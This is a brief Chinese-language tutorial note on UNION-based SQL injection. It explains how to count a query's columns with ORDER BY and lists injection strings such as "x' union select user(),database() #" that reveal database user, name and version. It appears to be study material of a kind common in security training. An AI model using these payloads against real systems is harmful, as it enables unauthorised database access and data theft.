union联合查询

select name,password from user where id = 1 
union select xx,xx from xx;
注意联合查询的字段数目要和主查询一致，否则不符合sql语法

如何知道系统查询了几列呢？
可以使用order by 1 2 3 4 ...
如果order by 5报错了
那么说明查询了4列

x' order by 2 #

x' union select user(),database() #
x' union select version(),database() #